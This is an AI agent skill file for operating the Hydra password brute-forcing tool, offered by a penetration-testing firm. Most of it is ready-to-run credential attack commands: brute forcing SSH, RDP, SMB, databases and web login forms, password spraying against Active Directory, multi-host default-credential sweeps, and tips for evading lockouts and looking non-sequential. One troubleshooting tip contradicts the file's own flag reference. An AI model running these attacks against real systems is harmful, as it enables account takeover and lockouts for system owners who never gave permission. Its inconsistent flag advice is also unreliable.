---
name: hydra
description: >
  Operate and tune Hydra (thc-hydra) — the fast, parallelized online password brute-forcing
  tool supporting 50+ protocols. Use when performing credential attacks against SSH, FTP,
  HTTP forms, RDP, SMB, MySQL, MSSQL, VNC, SNMP, LDAP, POP3, IMAP, SMTP, and more.
  Covers all major flags, http-form-post syntax, thread tuning, proxy routing, combo
  file usage, integration with CeWL/SecLists/crunch/Burp, and operational opsec
  considerations for authorized penetration testing engagements.
metadata:
  author: redhoundinfosec
  version: '1.0'
  repo: https://github.com/vanhauser-thc/thc-hydra
---

# hydra Agent Skill

## When to Use This Skill

Use this skill when:
- Performing online password attacks against network services
- Brute-forcing or spraying credentials on SSH, FTP, HTTP, RDP, SMB, MSSQL, MySQL, VNC, etc.
- The user asks about http-form-post syntax or HTTP authentication modes
- Building credential attack pipelines with CeWL, crunch, or SecLists
- Tuning thread counts, timeouts, and rate limits for production environments

## What Hydra Does

Hydra is a parallelized login cracker that supports 50+ protocols. It is the standard tool for online credential attacks in penetration testing — distinguishing it from offline hash crackers (hashcat, john) which operate against captured hashes. Hydra sends live authentication attempts over the network, making rate limiting, lockout policies, and service stability critical considerations.

## Installation

```bash
# Kali Linux (pre-installed)
which hydra && hydra --version

# apt
sudo apt update && sudo apt install hydra

# Build from source
git clone https://github.com/vanhauser-thc/thc-hydra.git
cd thc-hydra && ./configure && make && sudo make install

# macOS via Homebrew
brew install hydra

# Docker
docker pull vanhauser/hydra
docker run --rm vanhauser/hydra -h
```

## Core Concepts

### Credential Input Modes

| Mode | Flags | Description |
|------|-------|-------------|
| Single login + single pass | `-l admin -p password` | One credential pair |
| Single login + wordlist | `-l admin -P rockyou.txt` | Password spray one user |
| User list + single pass | `-L users.txt -p Password1` | Password spray |
| User list + password list | `-L users.txt -P passes.txt` | Full matrix |
| Combo file | `-C combo.txt` | Pre-paired `user:pass` lines |
| Login equals password | `-e s` | Same as user (samepass) |
| Null password | `-e n` | Empty password |
| Reverse password | `-e r` | Reversed username |

### Protocol Specifiers

Hydra uses `<protocol>://<host>` or `-s <port>` for non-standard ports. Protocol names are lowercase: `ssh`, `ftp`, `rdp`, `smb`, `http-get`, `http-post-form`, `https-post-form`, `mysql`, `mssql`, `vnc`, `snmp`, `ldap2`, `ldap3`, `pop3`, `imap`, `smtp`, `telnet`, `postgresql`, `oracle-listener`, `redis`, `mongodb`.

## CLI Reference

### Global Flags

```bash
-l LOGIN       # Single username
-L FILE        # Username list file
-p PASS        # Single password
-P FILE        # Password list file
-C FILE        # Colon-delimited combo file (login:pass per line)
-e nsr         # n=null pass, s=user as pass, r=reversed user as pass (combinable)
-t TASKS       # Parallel tasks per host (default 16; use 4 for SSH, 1 for RDP)
-T TASKS       # Total parallel tasks across all hosts
-w TIME        # Wait time between retries in seconds (default 30)
-W TIME        # Time between connection per thread (throttle)
-s PORT        # Non-standard port
-S             # Use SSL/TLS
-o FILE        # Output results to file
-f             # Stop after first valid credential found (per host)
-F             # Stop after first valid credential found (across all hosts)
-u             # Loop around users, not passwords (username outer loop)
-v / -V        # Verbose / show each attempt
-d             # Debug mode
-I             # Skip restore file — start fresh (ignore previous session)
-R             # Restore previous interrupted session
-x MIN:MAX:CHARSET  # Generate passwords on-the-fly (brute force mode)
-6             # Target IPv6 address
-m OPT         # Module-specific options (passed to the service module)
```

### Protocol Examples

#### SSH

```bash
# Single user, password list
hydra -l root -P /opt/seclists/Passwords/Leaked-Databases/rockyou.txt \
      -t 4 -o ssh_results.txt ssh://10.10.10.10

# User list + password list, non-standard port
hydra -L users.txt -P passwords.txt -s 2222 -t 4 ssh://10.10.10.10

# Try null/same/reverse passwords
hydra -L users.txt -e nsr -t 4 ssh://10.10.10.10

# Combo file
hydra -C /opt/seclists/Passwords/Default-Credentials/default-passwords.csv \
      -t 4 ssh://10.10.10.10
```

#### FTP

```bash
hydra -l anonymous -p anonymous -t 10 ftp://10.10.10.10
hydra -L users.txt -P passwords.txt -t 10 -f ftp://10.10.10.10
# Anonymous login attempt
hydra -l anonymous -P /dev/null ftp://10.10.10.10
```

#### HTTP GET (Basic Auth)

```bash
hydra -l admin -P /opt/seclists/Passwords/Common-Credentials/best110.txt \
      -t 20 http-get://10.10.10.10/admin
# With port
hydra -l admin -P passwords.txt -s 8080 http-get://10.10.10.10/protected
```

#### HTTP POST Form — CRITICAL SYNTAX

```bash
# Syntax: hydra ... http-post-form "PATH:POST_DATA:FAILURE_STRING"
# ^USER^ and ^PASS^ are mandatory placeholders

# Simple login form
hydra -l admin -P rockyou.txt 10.10.10.10 \
  http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"

# HTTPS POST form
hydra -l admin -P rockyou.txt 10.10.10.10 \
  https-post-form "/login.php:user=^USER^&pass=^PASS^:Login failed"

# Include CSRF token (static token captured from form)
hydra -l admin -P passwords.txt 10.10.10.10 \
  http-post-form "/login:_token=abc123&email=^USER^&password=^PASS^:Wrong"

# Use success string instead of failure string (prefix with S=)
hydra -l admin -P passwords.txt 10.10.10.10 \
  http-post-form "/login:user=^USER^&pass=^PASS^:S=Dashboard"

# Carry cookies from prior session (H= header injection)
hydra -l admin -P passwords.txt 10.10.10.10 \
  http-post-form "/login:user=^USER^&pass=^PASS^:F=error:H=Cookie: PHPSESSID=abc123"

# Custom header addition (H=HeaderName: Value)
hydra -l admin -P passwords.txt 10.10.10.10 \
  "http-post-form:/login:user=^USER^&pass=^PASS^:error:H=X-Forwarded-For: 127.0.0.1"
```

#### RDP

```bash
hydra -L users.txt -P passwords.txt -t 1 -W 3 rdp://10.10.10.10
# Note: RDP is sensitive — use -t 1, higher -w to avoid lockouts
```

#### SMB

```bash
hydra -L users.txt -P passwords.txt -t 1 smb://10.10.10.10
# Prefer NetExec/CrackMapExec for SMB spraying at scale
```

#### MySQL / MSSQL

```bash
hydra -l root -P passwords.txt -t 8 mysql://10.10.10.10
hydra -l sa -P passwords.txt -t 8 mssql://10.10.10.10
```

#### VNC

```bash
# VNC uses only passwords (no usernames)
hydra -P passwords.txt -t 4 vnc://10.10.10.10
```

#### SNMP

```bash
hydra -P /opt/seclists/Discovery/SNMP/common-snmp-community-strings.txt \
      -t 10 snmp://10.10.10.10
```

#### LDAP

```bash
hydra -l "cn=admin,dc=domain,dc=com" -P passwords.txt \
      ldap2://10.10.10.10
# LDAP3 (LDAPS)
hydra -l "administrator@domain.com" -P passwords.txt \
      ldap3://10.10.10.10
```

#### Email Protocols

```bash
# POP3
hydra -L users.txt -P passwords.txt -t 8 pop3://10.10.10.10
hydra -L users.txt -P passwords.txt -S -t 8 pop3://10.10.10.10  # POP3S

# IMAP
hydra -L users.txt -P passwords.txt -t 8 imap://10.10.10.10
hydra -L users.txt -P passwords.txt -S -t 8 imap://10.10.10.10  # IMAPS

# SMTP
hydra -L users.txt -P passwords.txt -t 8 smtp://10.10.10.10
hydra -l admin -P passwords.txt -s 587 smtp://mail.target.com
```

#### Telnet

```bash
hydra -l admin -P passwords.txt -t 4 -w 5 telnet://10.10.10.10
```

### Brute Force Mode (On-the-fly generation)

```bash
# -x MIN:MAX:CHARSET
# a=lowercase, A=uppercase, 1=digits, @=special chars

# All 4-char lowercase
hydra -l admin -x 4:4:a ssh://10.10.10.10

# 6-8 alphanumeric
hydra -l admin -x 6:8:aA1 ftp://10.10.10.10

# 4-digit PINs
hydra -l user -x 4:4:1 http-post-form "/pin:user=^USER^&pin=^PASS^:Wrong PIN"
```

### Proxy / Routing

```bash
# Route through SOCKS5 (e.g., via pivot)
export HYDRA_PROXY=socks5://127.0.0.1:1080
hydra -l admin -P passwords.txt ssh://10.10.10.10

# HTTP proxy
export HYDRA_PROXY=http://127.0.0.1:8080
hydra -l admin -P passwords.txt http-post-form "..."

# Specify inline (newer versions)
hydra -l admin -P passwords.txt -m socks5://127.0.0.1:9050 ssh://10.10.10.10
```

## Common Workflows

### Web Application Login Attack

```bash
# Step 1: Identify the login form fields using browser DevTools or Burp
# POST /login HTTP/1.1
# Body: email=test@test.com&password=test&_token=xxxx

# Step 2: Capture a baseline failure string
curl -s -X POST http://target.com/login -d "email=x&password=x" | grep -i "invalid\|wrong\|fail"

# Step 3: Run hydra
hydra -l admin@target.com \
      -P /opt/seclists/Passwords/Leaked-Databases/rockyou.txt \
      -t 16 -f \
      target.com https-post-form \
      "/login:email=^USER^&password=^PASS^&_token=<STATIC_TOKEN>:Invalid credentials"
```

### SSH Default Credentials Sweep (Multiple Hosts)

```bash
# targets.txt: one IP per line
hydra -L /opt/seclists/Usernames/top-usernames-shortlist.txt \
      -P /opt/seclists/Passwords/Default-Credentials/default-passwords.csv \
      -M targets.txt \
      -t 4 -T 16 -f -o ssh_defaults.txt \
      ssh
```

### Password Spray — AD Environment

```bash
# Use single password, full user list, slow rate to avoid lockout
hydra -L domain_users.txt -p 'Winter2024!' \
      -t 1 -W 30 \
      smb://dc01.domain.local

# Escalate after one hit: check password policy first
# net accounts /domain → check lockout threshold
```

### Post-CeWL Integration

```bash
# Generate target-specific wordlist
cewl -d 3 -m 5 -w /tmp/cewl.txt https://target.com

# Add common mutations
hashcat --stdout -r /usr/share/hashcat/rules/best64.rule /tmp/cewl.txt > /tmp/mutated.txt

# Attack with hybrid list
hydra -l admin -P /tmp/mutated.txt -t 8 https-post-form \
      "/wp-login.php:log=^USER^&pwd=^PASS^:ERROR"
```

## Advanced Techniques

### Restoring Interrupted Sessions

```bash
# Session files stored in ~/.thc-hydra/ or current dir
ls hydra.restore
hydra -R  # Restore last session
hydra -I -l admin -P rockyou.txt ssh://target  # Ignore restore, start fresh
```

### Output Parsing

```bash
# -o writes successful pairs to file
hydra -l admin -P rockyou.txt -o found.txt -f ssh://10.10.10.10

# Parse found.txt
grep "login:" found.txt | awk '{print $5, $7}'
```

### Evading Lockouts

```bash
# Add delay between attempts per thread
hydra -l admin -P rockyou.txt -t 4 -W 5 ssh://10.10.10.10
# -W 5 = 5 seconds between each attempt per thread

# Shuffle password list to appear non-sequential
shuf rockyou.txt > rockyou_shuffled.txt
```

### Crunch Integration (On-the-fly wordlist)

```bash
# Generate 8-char passwords from charset and pipe to hydra
crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 | \
  hydra -l admin -P - -t 8 ftp://10.10.10.10
```

## Troubleshooting

**Hydra finds no results but credentials are valid:**
- Verify the failure string is EXACTLY present in the response (use curl to confirm)
- Try `S=success_string` if failure string is ambiguous
- Check if CSRF token changes per request (static capture won't work — use Burp macros instead)

**Connection errors / too fast:**
- Reduce `-t` (try `-t 1` for RDP, `-t 4` for SSH)
- Add `-w 3` (wait 3s between retries)
- Confirm target port is open: `nmap -p 22 10.10.10.10`

**HTTP form attack returns all "successes":**
- Failure string is empty or not in response — tighten it with a unique phrase
- Use `-F` flag to verify the failure condition is stable

**RDP not working:**
- Hydra's RDP module requires freerdp; install with `sudo apt install freerdp2-x11`
- Use `-t 1 -W 3` — RDP rate-limits aggressively

**SSL certificate errors:**
- Use `-S` flag for SSL, or for self-signed certs consider `-m ":/CN=..."` or add cert to trust store

**Restore file conflict:**
- Delete `~/.thc-hydra/hydra.restore` or use `-I` to ignore and restart
---

> Built by [Red Hound InfoSec](https://redhound.us) — On-demand offensive security expertise for SMBs.
> 20+ years of Fortune 500 experience. Penetration testing, attack surface analysis, and security consulting.
>
> **Related reading**: [Hybrid Identity Under Attack: Securing the Bridge Between On-Prem AD and Entra ID](https://redhound.us/hybrid-identity-attack)
>
> [redhound.us](https://redhound.us) | [GitHub](https://github.com/redhoundinfosec) | [Book a consultation](https://redhound.us/#contact)
